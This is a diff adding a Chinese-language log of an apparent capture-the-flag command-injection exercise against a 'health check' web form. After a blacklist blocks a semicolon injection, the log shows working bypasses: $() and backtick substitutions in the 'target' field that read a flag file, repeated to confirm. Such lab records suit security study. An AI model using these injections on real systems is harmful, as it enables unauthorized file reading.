@@ -1,0 +1,22 @@
+=== 0 摸情况：首页有什么功能 ===
+<h1>Kali 系统健康检查</h1><p>输入一个地址，系统帮你检查：</p><form action="/check"><input name="target" value="127.0.0.1"><button type="submit">检查</button></form><p>提示：本系统已开启安全检查，非法字符会被拦截。</p>
+
+=== 1 正常请求（输入 127.0.0.1）===
+{"output": "Checking host: 127.0.0.1", "target": "127.0.0.1"}
+
+=== 2 直白注入：分号拼命令（预期被黑名单拦）===
+{"error": "检测到非法字符，请求被拒绝"}
+
+=== 3 绕过：用 $() 包住命令（黑名单没挡这个）===
+{"output": "Checking host: 127.0.0.1FLAG{kali_cmd_injection_2026}", "target": "127.0.0.1$(cat /tmp/kali_flag.txt)"}
+
+=== 4 绕过：用反引号包住命令 ===
+{"output": "Checking host: 127.0.0.1FLAG{kali_cmd_injection_2026}", "target": "127.0.0.1`cat /tmp/kali_flag.txt`"}
+
+=== 5 复现3次，确认不是碰巧 ===
+{"output": "Checking host: 127.0.0.1FLAG{kali_cmd_injection_2026}", "target": "127.0.0.1$(cat /tmp/kali_flag.txt)"}
+{"output": "Checking host: 127.0.0.1FLAG{kali_cmd_injection_2026}", "target": "127.0.0.1$(cat /tmp/kali_flag.txt)"}
+{"output": "Checking host: 127.0.0.1FLAG{kali_cmd_injection_2026}", "target": "127.0.0.1$(cat /tmp/kali_flag.txt)"}
+
+=== 6 对照：读一个不存在的文件 ===
+{"output": "Checking host: 127.0.0.1", "target": "127.0.0.1$(cat /tmp/no_such_file_xyz)"}
